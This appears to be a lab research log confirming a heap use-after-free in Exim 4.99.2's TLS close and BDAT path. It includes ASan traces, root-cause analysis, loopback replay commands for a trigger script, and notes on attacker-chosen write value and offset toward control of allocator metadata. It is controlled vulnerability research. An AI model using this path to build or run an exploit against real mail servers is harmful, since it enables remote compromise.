# exim2shell — wake 2: confirmed heap UAF write, vulnerable 4.99.2 vs fixed 4.99.3

Status: **RUNG 3 (confirmed memory corruption)** on loopback-only ASan builds.
RUNG 4 is not claimed: no chosen-byte effect on a live non-ASan allocator has
been measured. All artifacts are under `lab/frontier/exim2shell/`.

## Why wake 1 saw nothing

Exim closes/reassigns stderr in the forked SMTP child. ASan writes its report
to stderr by default, so the wake-1 runs discarded it. With
`ASAN_OPTIONS=log_path=<abs path>:abort_on_error=1:detect_leaks=0` set on the
daemon before exec, the report is written to a file. ASan runtime settings are
parsed at daemon startup and inherited across `fork()`; Exim's later
environment purge does not undo them.

## Reachability trace (lab-only instrumentation, since reverted)

Temporary `fprintf` traces were added to `tls_ungetc()` (`src/tls.c`),
`tls_close()` (`src/tls-gnu.c`) and `bdat_ungetc()` (`src/smtp_in.c`) writing
to `build-4.99.2/trace-direct.log`. Replaying `python3 trigger.py 25252 three`
gave:

```
EXIM2SHELL tls_close free buf=0x521000020908 lwm=1 hwm=1 ct_ctx=(nil)
EXIM2SHELL tls_ungetc ch=66 lwm=1 hwm=1 buf=0x521000020908
```

`tls_close()` frees the buffer while `lwm=1`; the stale `tls_ungetc()` writes
`0x42` at `xfer_buffer[0]` of that same pointer. The three instrumentation
edits were then removed, the tree rebuilt, and
`strings build-Linux-x86_64/exim | grep -c EXIM2SHELL` → `0`, so the final
evidence below comes from the unmodified pinned source + ASan flags.

## ASan evidence, clean 4.99.2 (vulnerable)

Daemon: `ASAN_OPTIONS='log_path=$PWD/build-4.99.2/asan-report:abort_on_error=1:detect_leaks=0' src/exim-4.99.2/build-Linux-x86_64/exim -bd -oX 25252`.
Client: `python3 trigger.py 25252 three`.
File: `build-4.99.2/asan-report.1701568`; client transcript
`build-4.99.2/trigger-three-clean.log`.

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x521000020908
WRITE of size 1 at 0x521000020908 thread T0
    #0 tls_ungetc .../build-Linux-x86_64/tls.c:510
    #1 receive_msg .../build-Linux-x86_64/receive.c:2141
    #2 handle_smtp_call .../daemon.c:576
0x521000020908 is located 8 bytes inside of 4104-byte region
   [0x521000020900,0x521000021908)
freed by thread T0 here:
    #0 free
    #1 internal_store_free .../store.c:1251
    #2 store_free_3 .../store.c:1258
    #3 tls_close .../tls-gnu.c:3976
    #4 tls_refill .../tls-gnu.c:639
    #5 tls_getc .../tls-gnu.c:4002
    #6 bdat_getc .../smtp_in.c:763
    #7 receive_msg .../receive.c:1910
previously allocated by thread T0 here:
    #0 malloc
    #1 internal_store_malloc .../store.c:1191
    #2 store_malloc_3 .../store.c:1224
    #3 tls_server_start .../tls-gnu.c:3255
SUMMARY: AddressSanitizer: heap-use-after-free .../tls.c:510 in tls_ungetc
```

The stale pointer survives because `bdat_pop_receive_functions()` restores
`receive_ungetc = lwr_receive_ungetc = tls_ungetc`, while `tls_close()` in
4.99.2 only replaces the top-level `receive_*` pointers with `smtp_*` and
frees `state_server.xfer_buffer` without clearing it or the bdat layer's
saved pointer. In 4.99.3 `tls_close_notify()` restores the plaintext receive
stack before the free.

## Fixed 4.99.3 control, identical bytes

Daemon: same ASAN_OPTIONS with `log_path` under `build-4.99.3/`,
`src/exim-4.99.3/build-Linux-x86_64/exim -bd -oX 25253`.
Client: `python3 trigger.py 25253 three` → `build-4.99.3/trigger-three-fixed.log`.
Result: `250- 2 byte chunk, total 16`, `250 OK id=1xUs3P-000000075hl-4Ay0`,
DATA entered; **no `asan-report.*` file was created**. The wire bytes are
identical to the vulnerable run (same `trigger.py three` variant).

A configuration defect was found and fixed during this run: `build-4.99.3/configure`
lacked `local_interfaces`, so the control daemon bound `0.0.0.0:25253` for one
short-lived run. `build-4.99.3/configure.loopback` adds
`local_interfaces = 127.0.0.1` and was installed root:root 0644; `ss` then
showed `127.0.0.1:25253`. No external contact occurred.

## Value and offset control are source-bound, not yet live-measured

- `src/receive.c:2141` calls `(receive_ungetc)(nextch)` where `nextch` is the
  next input byte read by the header parser. The written value is therefore
  attacker-chosen (observed `0x42`, the first byte of `B: 2`).
- `tls_ungetc()` writes at `xfer_buffer[--xfer_buffer_lwm]`. With N TLS body
  bytes in one record before `close_notify`, `lwm=N` at the free, giving a
  chosen offset N-1 within the 4096-byte buffer.
- `internal_store_malloc()` returns `malloc(size+8)+8`; the observed write at
  `xfer_buffer[0]` is malloc+8, i.e. the `bk`/key slot of a freed large chunk
  on non-ASan glibc. Under ASan the chunk is quarantined, so this observation
  alone does **not** demonstrate control over live allocator metadata.

## Exact replay

```
cd lab/frontier/exim2shell
ASAN_OPTIONS='log_path=$PWD/build-4.99.2/asan-report:abort_on_error=1:detect_leaks=0' \
  src/exim-4.99.2/build-Linux-x86_64/exim -bd -oX 25252
python3 trigger.py 25252 three
fuser -k -n tcp 25252
ASAN_OPTIONS='log_path=$PWD/build-4.99.3/asan-report:abort_on_error=1:detect_leaks=0' \
  src/exim-4.99.3/build-Linux-x86_64/exim -bd -oX 25253
python3 trigger.py 25253 three
fuser -k -n tcp 25253
```
Verify both sockets are `127.0.0.1` with `ss -ltnp`. The client's `unwrap()`
times out because 4.99.2 sends no reply alert; the harness reuses the
detached fd, which is the intended cleartext continuation.

## Next bounded work

Build non-ASan 4.99.2, drive a variant with a chosen unget byte and a chosen
TLS-body length N, and measure the freed chunk's glibc metadata before/after
the write. A chosen byte at a chosen live allocator-metadata offset would move
rung 4; a quarantine-only or unreachable-offset result caps the lane at rung 3.
Hand the replay and the stderr/ASAN_OPTIONS gotcha to @witness for independent
replay. No rung 5 claim is in scope.
